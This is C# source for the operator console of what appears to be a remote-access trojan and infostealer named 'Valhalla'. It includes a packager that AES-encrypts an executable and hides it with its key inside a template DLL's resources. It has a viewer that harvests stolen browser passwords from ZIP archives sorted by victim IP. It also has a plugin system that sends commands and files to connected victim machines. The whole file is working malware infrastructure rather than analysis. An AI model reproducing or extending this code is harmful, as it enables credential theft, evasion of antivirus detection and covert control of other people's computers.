                MessageBox.Show(this, "Build complete.", "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                simpleButton6.Enabled = true;
            }
        }
        private void AppendColoredText(RichTextBox box, string text, Color color)
        {
            box.SelectionStart = box.TextLength;
            box.SelectionLength = 0;
            box.SelectionColor = color;
            box.AppendText(text);
            box.SelectionColor = box.ForeColor;

            // Auto-scroll to the end
            box.ScrollToCaret();
        }

        // Helper method to create a text-based progress bar
        private void AppendProgressBar(RichTextBox box, int percentComplete)
        {
            int barWidth = 50;
            int completedWidth = (int)(barWidth * percentComplete / 100.0);

            StringBuilder sb = new StringBuilder();
            sb.Append('[');

            for (int i = 0; i < barWidth; i++)
            {
                if (i < completedWidth)
                    sb.Append('█');
                else
                    sb.Append('░');
            }

            sb.Append(']');
            sb.Append($" {percentComplete}%");
            sb.Append("\n");

            AppendColoredText(box, sb.ToString(), percentComplete == 100 ? SidebarAccentColor : Color.Orange);
        }

        private void panelControl18_Paint(object sender, PaintEventArgs e)
        {

        }

        private void checkEdit4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkEdit4.Checked)
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon Files (*.ico)|*.ico";
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        OpenFileDialogIcon = openFileDialog.FileName;
                        AppendColoredText(richTextBox2, "✓ Custom Icon: ", SidebarAccentColor);
                        AppendColoredText(richTextBox2, $"{Path.GetFileName(OpenFileDialogIcon)}\n", Color.White);

                        textEdit5.Text = Path.GetFileName(OpenFileDialogIcon);
                    }
                    else
                    {
                        // User cancelled dialog, uncheck the checkbox
                        checkEdit4.Checked = false;
                        AppendColoredText(richTextBox2, "❌ Custom icon selection cancelled\n", Color.Red);
                    }
                }
            }
            else
            {
                // Checkbox unchecked, clear the icon path
                OpenFileDialogIcon = string.Empty;
                AppendColoredText(richTextBox2, "✓ Custom Icon: ", SidebarAccentColor);
                AppendColoredText(richTextBox2, "DEFAULT\n", Color.Gray);
            }
        }

        private void simpleButton7_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear the terminal output
                richTextBox3.Clear();
                AppendColoredText(richTextBox3, "⚙️ Starting executable packaging process...\n", Color.Yellow);

                // Ask user to select the executable to encrypt
                string executablePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Executable files (*.exe)|*.exe";
                    openFileDialog.Title = "Select Executable to Encrypt";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        executablePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected executable: ", SidebarAccentColor);
                        AppendColoredText(richTextBox3, $"{executablePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Generate random encryption key
                AppendColoredText(richTextBox3, "⚙️ Generating encryption key...\n", Color.Yellow);
                byte[] key = new byte[32]; // 256-bit key for AES
                using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                {
                    rng.GetBytes(key);
                }
                string base64Key = Convert.ToBase64String(key);
                AppendColoredText(richTextBox3, "✓ Encryption key generated\n", SidebarAccentColor);

                // Read the executable file
                AppendColoredText(richTextBox3, "⚙️ Reading executable file...\n", Color.Yellow);
                byte[] executableBytes = File.ReadAllBytes(executablePath);
                AppendColoredText(richTextBox3, $"✓ Read {executableBytes.Length:N0} bytes\n", SidebarAccentColor);

                // Encrypt the executable
                AppendColoredText(richTextBox3, "⚙️ Encrypting executable with AES-256...\n", Color.Yellow);
                byte[] encryptedData = EncryptData(executableBytes, key);
                AppendColoredText(richTextBox3, $"✓ Encrypted size: {encryptedData.Length:N0} bytes\n", SidebarAccentColor);

                // Ask for the DLL template path
                string dllTemplatePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "DLL files (*.dll)|*.dll";
                    openFileDialog.Title = "Select DLL Template";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        dllTemplatePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected DLL template: ", SidebarAccentColor);
                        AppendColoredText(richTextBox3, $"{dllTemplatePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Create output path for the modified DLL
                string outputPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    $"Packed_{RandomStringGenerator.Generate(8)}.dll");

                // Embed resources in the DLL
                AppendColoredText(richTextBox3, "⚙️ Embedding resources in DLL...\n", Color.Yellow);

                // First, copy the DLL template to the output location
                File.Copy(dllTemplatePath, outputPath, true);
                AppendColoredText(richTextBox3, "✓ Template DLL copied\n", SidebarAccentColor);

                // Now add the resources using WinAPI
                AppendColoredText(richTextBox3, "⚙️ Adding encrypted data as resource...\n", Color.Yellow);
                if (UpdateResource(outputPath, "BINARY", "enc.bin", encryptedData))
                {
                    AppendColoredText(richTextBox3, "✓ Encrypted data embedded successfully\n", SidebarAccentColor);
                }
                else
                {
                    throw new Exception("Failed to embed encrypted data");
                }

                AppendColoredText(richTextBox3, "⚙️ Adding encryption key as resource...\n", Color.Yellow);
                byte[] keyBytes = Encoding.UTF8.GetBytes(base64Key);
                if (UpdateResource(outputPath, "TEXT", "key.txt", keyBytes))
                {
                    AppendColoredText(richTextBox3, "✓ Encryption key embedded successfully\n", SidebarAccentColor);
                }
                else
                {
                    throw new Exception("Failed to embed encryption key");
                }

                AppendColoredText(richTextBox3, "\n✅ PACKAGING COMPLETED! ✅\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "📂 Output DLL: ", Color.White);
                AppendColoredText(richTextBox3, $"{outputPath}\n", Color.Yellow);

                AppendColoredText(richTextBox3, "\n📋 Summary:\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Original Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{executableBytes.Length:N0} bytes\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Encrypted Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{encryptedData.Length:N0} bytes\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Encryption: ", Color.White);
                AppendColoredText(richTextBox3, "AES-256\n", SidebarAccentColor);

                // Show success message
                MessageBox.Show(
                    $"DLL package created successfully!\n\nOutput: {outputPath}",
                    "Packaging Complete",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, "\n❌ PACKAGING FAILED! ❌\n", Color.Red);
                AppendColoredText(richTextBox3, $"Error: {ex.Message}\n", Color.Red);
                AppendColoredText(richTextBox3, $"Stack Trace: {ex.StackTrace}\n", Color.DarkGray);

                MessageBox.Show($"Error packaging executable: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
        private byte[] EncryptData(byte[] data, byte[] key)
        {
            using (var aes = System.Security.Cryptography.Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV(); // Generate random IV

                using (var memoryStream = new MemoryStream())
                {
                    // First write the IV so we can retrieve it later
                    memoryStream.Write(aes.IV, 0, aes.IV.Length);

                    using (var cryptoStream = new CryptoStream(
                        memoryStream,
                        aes.CreateEncryptor(),
                        CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data, 0, data.Length);
                        cryptoStream.FlushFinalBlock();
                    }

                    return memoryStream.ToArray();
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool UpdateResourceW(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, byte[] lpData, uint cbData);

        // Helper method to update a resource in a PE file
        private bool UpdateResource(string filePath, string type, string name, byte[] data)
        {
            // Begin the update session
            IntPtr hUpdate = BeginUpdateResource(filePath, false);
            if (hUpdate == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                AppendColoredText(richTextBox3, $"❌ BeginUpdateResource failed with error: {error}\n", Color.Red);
                return false;
            }

            try
            {
                // Update the resource
                if (!UpdateResourceW(hUpdate, type, name, 0, data, (uint)data.Length))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ UpdateResourceW failed with error: {error}\n", Color.Red);
                    EndUpdateResource(hUpdate, true); // Discard changes
                    return false;
                }

                // Commit the changes
                if (!EndUpdateResource(hUpdate, false))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ EndUpdateResource failed with error: {error}\n", Color.Red);
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, $"❌ Exception during resource update: {ex.Message}\n", Color.Red);
                EndUpdateResource(hUpdate, true); // Discard changes
                return false;
            }
        }
        private void simpleButton3_Click_1(object sender, EventArgs e)
        {
            try
            {
                // Create a DataTable to store the password entries
                DataTable passwordTable = new DataTable();
                passwordTable.Columns.Add("URL", typeof(string));
                passwordTable.Columns.Add("WebBrowser", typeof(string));
                passwordTable.Columns.Add("UserName", typeof(string));
                passwordTable.Columns.Add("Password", typeof(string));
                passwordTable.Columns.Add("Strength", typeof(string));
                passwordTable.Columns.Add("CreatedTime", typeof(string));
                passwordTable.Columns.Add("ClientIP", typeof(string));

                // Get the Clients folder path
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int totalPasswords = 0;
                int processedFolders = 0;
                int totalFolders = Directory.GetDirectories(clientsFolder).Length;

                // Show progress form
                using (Form progressForm = new Form())
                {
                    progressForm.Text = "Processing Password Files";
                    progressForm.Width = 400;
                    progressForm.Height = 150;
                    progressForm.FormBorderStyle = FormBorderStyle.FixedDialog;
                    progressForm.StartPosition = FormStartPosition.CenterScreen;
                    progressForm.MaximizeBox = false;
                    progressForm.MinimizeBox = false;
                    progressForm.ShowIcon = false;

                    Label statusLabel = new Label { Left = 20, Top = 20, Width = 360, Text = "Scanning client folders..." };
                    ProgressBar progressBar = new ProgressBar { Left = 20, Top = 50, Width = 360, Height = 20, Minimum = 0, Maximum = 100, Value = 0 };
                    Label countLabel = new Label { Left = 20, Top = 80, Width = 360, Text = "Found: 0 passwords" };

                    progressForm.Controls.Add(statusLabel);
                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(countLabel);

                    // Start the processing in a background thread
                    Thread workerThread = new Thread(() =>
                    {
                        // Process each client folder
                        foreach (string clientFolder in Directory.GetDirectories(clientsFolder))
                        {
                            string clientIP = Path.GetFileName(clientFolder).Replace('_', '.');
                            statusLabel.Invoke((MethodInvoker)delegate {
                                statusLabel.Text = $"Processing client: {clientIP}";
                            });

                            // Find all zip files in the client folder
                            var zipFiles = Directory.GetFiles(clientFolder, "*.zip");
                            foreach (string zipFile in zipFiles)
                            {
                                try
                                {
                                    using (ZipArchive archive = ZipFile.OpenRead(zipFile))
                                    {
                                        // Find password files in the zip - UPDATED to match your actual filenames
                                        var passwordEntries = archive.Entries.Where(entry =>
                                            entry.Name.Equals("ChromeV20Passwords.txt", StringComparison.OrdinalIgnoreCase) ||
                                            entry.Name.Equals("GetAllPasswords.txt", StringComparison.OrdinalIgnoreCase));

                                        foreach (var entry in passwordEntries)
                                        {
                                            using (StreamReader reader = new StreamReader(entry.Open()))
                                            {
                                                string line;
                                                Dictionary<string, string> currentEntry = null;

                                                while ((line = reader.ReadLine()) != null)
                                                {
                                                    if (line == "==================================================")
                                                    {
                                                        // Start of a new entry or end of current entry
                                                        if (currentEntry != null && currentEntry.Count > 0)
                                                        {
                                                            // Add completed entry to our DataTable
                                                            DataRow row = passwordTable.NewRow();

                                                            row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                            row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                            row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                            row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                            row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                            row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                            row["ClientIP"] = clientIP;

                                                            passwordTable.Rows.Add(row);
                                                            totalPasswords++;

                                                            // Update count label
                                                            countLabel.Invoke((MethodInvoker)delegate {
                                                                countLabel.Text = $"Found: {totalPasswords} passwords";
                                                            });
                                                        }

                                                        // Start a new entry
                                                        currentEntry = new Dictionary<string, string>();
                                                    }
                                                    else if (currentEntry != null && line.Contains(":"))
                                                    {
                                                        // Parse key-value pairs
                                                        int colonIndex = line.IndexOf(':');
                                                        if (colonIndex > 0)
                                                        {
                                                            string key = line.Substring(0, colonIndex).Trim();
                                                            string value = line.Substring(colonIndex + 1).Trim();
                                                            currentEntry[key] = value;
                                                        }
                                                    }
                                                }

                                                // Handle the last entry if there is one
                                                if (currentEntry != null && currentEntry.Count > 0)
                                                {
                                                    DataRow row = passwordTable.NewRow();

                                                    row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                    row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                    row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                    row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                    row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                    row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                    row["ClientIP"] = clientIP;

                                                    passwordTable.Rows.Add(row);
                                                    totalPasswords++;

                                                    // Update count label
                                                    countLabel.Invoke((MethodInvoker)delegate {
                                                        countLabel.Text = $"Found: {totalPasswords} passwords";
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception zipEx)
                                {
                                    // Log error but continue processing
                                    Console.WriteLine($"Error processing zip file {zipFile}: {zipEx.Message}");
                                }
                            }

                            processedFolders++;
                            int progressValue = (int)((float)processedFolders / totalFolders * 100);

                            // Update progress bar
                            progressBar.Invoke((MethodInvoker)delegate {
                                progressBar.Value = progressValue;
                            });
                        }

                        // Signal completion and close the progress form
                        progressForm.Invoke((MethodInvoker)delegate {
                            progressForm.DialogResult = DialogResult.OK;
                        });
                    });

                    workerThread.IsBackground = true;
                    workerThread.Start();

                    // Show the form and wait for completion
                    if (progressForm.ShowDialog() == DialogResult.OK)
                    {
                        // Display the results in the grid
                        gridControl2.DataSource = passwordTable;

                        // Configure grid view for better visualization
                        var gridView = gridControl2.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                        if (gridView != null)
                        {
                            // Auto-size columns
                            gridView.BestFitColumns();

                            // Add column sorting
                            foreach (DevExpress.XtraGrid.Columns.GridColumn column in gridView.Columns)
                            {
                                column.SortMode = DevExpress.XtraGrid.ColumnSortMode.Value;
                            }

                            // Set up search functionality with textEdit2 to search in multiple columns
                            textEdit2.TextChanged += (sender2, args) =>
                            {
                                string searchText = textEdit2.Text.ToLowerInvariant();

                                if (string.IsNullOrWhiteSpace(searchText))
                                {
                                    // Clear filter if search box is empty
                                    gridView.ClearColumnsFilter();
                                }
                                else
                                {
                                    // Filter in URL, UserName, and Password columns
                                    gridView.ActiveFilterString =
                                        $"[URL] LIKE '%{searchText}%' OR " +
                                        $"[UserName] LIKE '%{searchText}%' OR " +
                                        $"[Password] LIKE '%{searchText}%'";
                                }
                            };
                        }

                        if (totalPasswords > 0)
                        {
                            // Show result information
                            MessageBox.Show(
                                $"Password scan completed!\n\nFound {totalPasswords} passwords from {totalFolders} clients.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                        else
                        {
                            MessageBox.Show(
                                "No passwords found. Please check that files exist inside the client ZIP files.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error processing password files: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void simpleButton4_Click(object sender, EventArgs e)
        {
            try
            {
                // Setup the file manager using DevExpress grid properly
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Set up file manager if not already done
                SetupFileManager();

                // Navigate to Clients folder
                NavigateToFolder(clientsFolder);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error initializing file manager: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


        private void InitializePluginManagerPage()
        {
            pluginManagerTabPage.Controls.Clear();
            pluginManagerTabPage.BackColor = Color.FromArgb(38, 38, 38);
            pluginManagerGrid = new DevExpress.XtraGrid.GridControl { Dock = DockStyle.Fill, Name = "pluginManagerGrid", UseEmbeddedNavigator = false };
            pluginManagerGridView = new DevExpress.XtraGrid.Views.Grid.GridView(pluginManagerGrid);
            pluginManagerGrid.MainView = pluginManagerGridView;
            pluginManagerGrid.ViewCollection.Add(pluginManagerGridView);
            pluginManagerTable = new DataTable("Plugins");
            pluginManagerTable.Columns.Add("Plugin", typeof(string));
            pluginManagerTable.Columns.Add("Version", typeof(string));
            pluginManagerTable.Columns.Add("Server", typeof(string));
            pluginManagerTable.Columns.Add("Client", typeof(string));
            pluginManagerTable.Columns.Add("Status", typeof(string));
            pluginManagerGridView.OptionsBehavior.AutoPopulateColumns = false;
            pluginManagerGridView.Columns.AddVisible("Plugin", "Plugin");
            pluginManagerGridView.Columns.AddVisible("Version", "Version");
            pluginManagerGridView.Columns.AddVisible("Server", "Server DLL");
            pluginManagerGridView.Columns.AddVisible("Client", "Client DLL");
            pluginManagerGridView.Columns.AddVisible("Status", "Status");
            pluginManagerGrid.DataSource = pluginManagerTable;
            pluginManagerGridView.OptionsBehavior.Editable = false;
            pluginManagerGridView.OptionsSelection.MultiSelect = true;
            pluginManagerGridView.OptionsSelection.MultiSelectMode = DevExpress.XtraGrid.Views.Grid.GridMultiSelectMode.RowSelect;
            pluginManagerGridView.OptionsView.ShowGroupPanel = false;
            pluginManagerGridView.OptionsView.ShowIndicator = false;
            pluginManagerGridView.OptionsView.ColumnAutoWidth = false;
            pluginManagerGridView.RowHeight = 32;
            pluginManagerGridView.Columns["Plugin"].Caption = "Plugin";
            pluginManagerGridView.Columns["Version"].Caption = "Version";
            pluginManagerGridView.Columns["Server"].Caption = "Server DLL";
            pluginManagerGridView.Columns["Client"].Caption = "Client DLL";
            pluginManagerGridView.Columns["Status"].Caption = "Status";
            pluginManagerGridView.Columns["Plugin"].Width = 180;
            pluginManagerGridView.Columns["Version"].Width = 100;
            pluginManagerGridView.Columns["Server"].Width = 270;
            pluginManagerGridView.Columns["Client"].Width = 270;
            pluginManagerGridView.Columns["Status"].Width = 110;
            pluginManagerPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
            {
                Name = "pluginManagerPopupMenu",
                MinWidth = ContextParentMenuWidth
            };
            pluginLoadItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Load Plugin")
            {
                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
            };
            pluginUnloadItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Unload Plugin")
            {
                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
            };
            pluginLoadItem.ImageOptions.Image = null;
            pluginLoadItem.ImageOptions.SvgImage = null;
            pluginUnloadItem.ImageOptions.Image = null;
            pluginUnloadItem.ImageOptions.SvgImage = null;
            pluginLoadItem.ItemClick += delegate { LoadPluginFromDialog(); };
            pluginUnloadItem.ItemClick += delegate { UnloadSelectedPlugin(); };
            pluginManagerPopupMenu.AddItem(pluginLoadItem);
            pluginManagerPopupMenu.AddItem(pluginUnloadItem);
            pluginManagerGrid.MouseDoubleClick += delegate { StartSelectedPlugin(); };
            pluginManagerGrid.KeyDown += delegate(object sender, KeyEventArgs e) { if (e.KeyCode == Keys.Enter) { e.Handled = true; StartSelectedPlugin(); } };
            pluginManagerGrid.MouseUp += delegate(object sender, MouseEventArgs e)
            {
                if (e.Button == MouseButtons.Right && pluginManagerPopupMenu != null)
                {
                    pluginUnloadItem.Enabled = GetSelectedPluginName() != null;
                    pluginManagerPopupMenu.ShowPopup(Control.MousePosition);
                }
            };
            pluginManagerTabPage.Controls.Add(pluginManagerGrid);
            RefreshPluginManagerGrid();
        }

        private void LoadPluginFromDialog()
        {
            using (OpenFileDialog dialog = new OpenFileDialog { Title = "Load Server Plugin", Filter = "Plugin server (*.server.dll)|*.server.dll", CheckFileExists = true, Multiselect = false })
            {
                if (dialog.ShowDialog(this) != DialogResult.OK) return;
                LoadedPlugin loaded;
                string error;
                if (!pluginManager.TryLoadServer(dialog.FileName, out loaded, out error))
                {
                    MessageBox.Show(this, error, "Plugin Load Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                RefreshPluginManagerGrid();
                LogServerEvent("Plugin loaded: " + loaded.Name, LogType.Success);
            }
        }

        private string GetSelectedPluginName()
        {
            if (pluginManagerGridView == null) return null;
            int row = pluginManagerGridView.FocusedRowHandle;
            if (row < 0) return null;
            return Convert.ToString(pluginManagerGridView.GetRowCellValue(row, "Plugin"));
        }

        private void UnloadSelectedPlugin()
        {
            string name = GetSelectedPluginName();
            if (string.IsNullOrWhiteSpace(name)) return;
            if (MessageBox.Show(this, "Unload plugin '" + name + "'?", "Unload Plugin", MessageBoxButtons.OKCancel, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) != DialogResult.OK) return;
            if (pluginManager.Unload(name)) { RefreshPluginManagerGrid(); ConfigureDynamicPluginMenu(); }
        }

        private void StartSelectedPlugin()
        {
            string name = GetSelectedPluginName();
            if (string.IsNullOrWhiteSpace(name)) return;
            LoadedPlugin p = pluginManager.Snapshot().FirstOrDefault(x => string.Equals(x.Name, name, StringComparison.OrdinalIgnoreCase));
            if (p == null) return;
            string error;
            if (!pluginManager.Start(name, out error))
            {
                MessageBox.Show(this, error, "Plugin Start Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            RefreshPluginManagerGrid();
            LogServerEvent("Plugin active: " + p.Name, LogType.Success);
        }

        private void RefreshPluginManagerGrid()
        {
            if (pluginManagerTable == null) return;
            pluginManagerTable.BeginLoadData();
            pluginManagerTable.Rows.Clear();
            foreach (LoadedPlugin p in pluginManager.Snapshot())
                pluginManagerTable.Rows.Add(p.Name, p.Version, Path.GetFileName(p.ServerPath), Path.GetFileName(p.ClientPath), p.Running ? "Loaded" : "Stopped");
            pluginManagerTable.EndLoadData();
            if (pluginManagerGridView != null) pluginManagerGridView.RefreshData();
            ConfigureDynamicPluginMenu();
        }

        private void ConfigureDynamicPluginMenu()
        {
            if (connectionsPluginsMenu == null) return;
            connectionsPluginsMenu.ItemLinks.Clear();
            foreach (LoadedPlugin plugin in pluginManager == null ? new List<LoadedPlugin>() : pluginManager.Snapshot())
            {
                LoadedPlugin captured = plugin;
                DevExpress.XtraBars.BarButtonItem item = CreateConnectionMenuItem(captured.Name, delegate {
                    List<string> ids = GetSelectedConnectionIdsList();
                    foreach (string cid in ids) SendPluginText(cid, captured.Name, "ping:plugin");
                });
                connectionsPluginsMenu.AddItem(item);
            }
            if (connectionsPluginsMenu.ItemLinks.Count == 0)
                connectionsPluginsMenu.Visibility = DevExpress.XtraBars.BarItemVisibility.Never;
            else
                connectionsPluginsMenu.Visibility = DevExpress.XtraBars.BarItemVisibility.Always;
        }

        private ValhallaPluginConnection[] GetPluginConnectionSnapshot()
        {
            Func<ValhallaPluginConnection[]> snapshot = delegate
            {
                if (clientsTable == null) return new ValhallaPluginConnection[0];
                List<ValhallaPluginConnection> list = new List<ValhallaPluginConnection>();
                foreach (DataRow row in clientsTable.Rows)
                    list.Add(new ValhallaPluginConnection {
                        ConnectionId = Convert.ToString(row["ConnectionId"]), UserName = Convert.ToString(row["UserName"]),
                        ComputerName = Convert.ToString(row["Nickname"]), Fingerprint = Convert.ToString(row["Fingerprint"]),
                        Version = Convert.ToString(row["Version"]), IpAddress = Convert.ToString(row["IP"])
                    });
                return list.ToArray();
            };
            if (InvokeRequired) return (ValhallaPluginConnection[])Invoke(snapshot);
            return snapshot();
        }

        private bool SendPluginText(string connectionId, string pluginName, string message)
        {
            string raw = "CMD:PLUGIN_MSG:" + pluginName + ":" + Convert.ToBase64String(Encoding.UTF8.GetBytes(message ?? string.Empty));
            return SendPluginRaw(connectionId, raw, "PLUGIN_MSG:" + pluginName);
        }

        private bool SendPluginBytes(string connectionId, string pluginName, byte[] payload)
        {
            byte[] data = payload ?? new byte[0];
            string raw = "CMD:PLUGIN_MSG:" + pluginName + ":" + Convert.ToBase64String(data);
            return SendPluginRaw(connectionId, raw, "PLUGIN_MSG:" + pluginName);
        }

        private bool UnloadPluginClient(string connectionId, string pluginName)
        {
            return SendPluginRaw(connectionId, "CMD:UNLOAD:" + pluginName, "PLUGIN_OUT:" + pluginName);
        }

        private bool ResumePluginFileSend(string connectionId, string transferId)
        {
            if (string.IsNullOrWhiteSpace(transferId) || transferId.Any(char.IsControl)) return false;
            return SendPluginRaw(connectionId, "CMD:PLUGIN_RESUME:" + transferId.Trim(), "PLUGIN_RESUME:" + transferId.Trim());
        }

        private bool SendPluginEvent(string connectionId, string eventName)
        {
            if (string.IsNullOrWhiteSpace(eventName) || eventName.Any(char.IsControl)) return false;
            return SendPluginRaw(connectionId, "CMD:PLUGIN_EVENT:" + eventName.Trim(), "PLUGIN_EVENT:" + eventName.Trim());
        }

        private bool SendPluginRaw(string connectionId, string raw, string ackKey)
        {
            if (IsRelayConnectionId(connectionId))
            {
                try
                {
                    string target = GetConnectionFingerprint(connectionId);
                    if (string.IsNullOrWhiteSpace(target) || relayGatewayClient == null || !relayGatewayClient.IsConnected) return false;
                    RelayCommandResult result = relayGatewayClient.SendCommandAsync(target, raw, CancellationToken.None).GetAwaiter().GetResult();
                    if (!result.Accepted) LogFinalCommandResult(ackKey, "failed: " + result.Detail, LogType.Error);
                    return result.Accepted;
                }
                catch (Exception ex)
                {
                    LogFinalCommandResult(ackKey, "failed: " + ex.Message, LogType.Error);
                    return false;
                }
            }

            TcpClient client;
            lock (connectionStateLock) if (!connectedClients.TryGetValue(connectionId, out client)) return false;
            Guid id = Guid.NewGuid();
            string key = connectionId + "|" + ackKey.ToUpperInvariant();
            TrackPendingCommand(connectionId, ackKey, id, true);
            try
            {
                byte[] bytes = Encoding.UTF8.GetBytes(raw + "\n");
                NetworkStream stream = client.GetStream(); stream.Write(bytes, 0, bytes.Length); stream.Flush();
                DateTime deadline = DateTime.UtcNow.AddSeconds(10);
                while (DateTime.UtcNow < deadline)
                {
                    lock (connectionStateLock)
                    {
                        bool? result = null;
                        if (!pendingCommands.ContainsKey(key) && completedCommandResults.TryGetValue(key, out bool ack)) { result = ack; completedCommandResults.Remove(key); }
                        if (result.HasValue) return result.Value;
                    }
                    Thread.Sleep(25);
                }
                RemovePendingCommandIfCurrent(key, id);
                return false;
            }
            catch
            {
                RemovePendingCommandIfCurrent(key, id);
                return false;
            }
        }

        private bool SendPluginFile(string connectionId, string pluginName, string localPath, string remoteName)
        {
            if (string.IsNullOrWhiteSpace(localPath) || !File.Exists(localPath)) return false;
            FileInfo info = new FileInfo(localPath);
            if (info.Length == 0 || info.Length > 256L * 1024L * 1024L) return false;
            string hash;
            using (SHA256 sha = SHA256.Create())
            using (FileStream fs = File.OpenRead(localPath))
                hash = BitConverter.ToString(sha.ComputeHash(fs)).Replace("-", "").ToLowerInvariant();
            string transferId = hash;
            if (!SendPluginRaw(connectionId, "CMD:PLUGIN_BEGIN:" + pluginName + ":" + transferId + ":" + info.Length + ":" + hash + ":" + (string.IsNullOrWhiteSpace(remoteName) ? Path.GetFileName(localPath) : Path.GetFileName(remoteName)), "PLUGIN_BEGIN:" + transferId)) return false;
            const int chunk = 128 * 1024;
            byte[] buffer = new byte[chunk];
            using (FileStream fs = File.OpenRead(localPath))
            {
                long offset = 0;
                int count;
                while ((count = fs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    byte[] part = new byte[count];
                    Buffer.BlockCopy(buffer, 0, part, 0, count);
                    if (!SendPluginRaw(connectionId, "CMD:PLUGIN_CHUNK:" + transferId + ":" + offset + ":" + Convert.ToBase64String(part), "PLUGIN_CHUNK:" + transferId + ":" + offset)) return false;
                    offset += count;
                }
            }
